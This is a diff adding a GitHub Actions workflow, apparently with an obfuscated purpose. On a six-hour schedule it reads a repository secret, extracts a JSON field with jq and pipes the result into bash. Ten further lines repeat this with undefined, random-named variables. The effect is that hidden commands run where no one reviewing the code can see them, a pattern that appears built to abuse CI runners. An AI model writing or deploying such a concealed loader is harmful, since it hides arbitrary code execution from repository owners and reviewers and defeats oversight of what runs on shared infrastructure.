@@ -1,0 +1,26 @@
+name: cheshuimalongdesj
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: cheshuimalongdesj
+        env:
+          ptbb86575: ${{ secrets.ptbb86575 }}
+        run: |
+          echo $ptbb86575 | jq -r .lsuvq7 | /bin/bash
+          echo $yfej0647 | jq -r .o880 | /bin/bash
+          echo $ld2897 | jq -r .ms6 | /bin/bash
+          echo $yrzm6 | jq -r .izupy98543 | /bin/bash
+          echo $bi7776 | jq -r .b44 | /bin/bash
+          echo $hm26 | jq -r .cp75 | /bin/bash
+          echo $qwfs17 | jq -r .a07672 | /bin/bash
+          echo $em201 | jq -r .he64272 | /bin/bash
+          echo $aky721 | jq -r .ntpa52772 | /bin/bash
+          echo $aldft97 | jq -r .um47 | /bin/bash
+          echo $cz027 | jq -r .gkjg42830 | /bin/bash
+
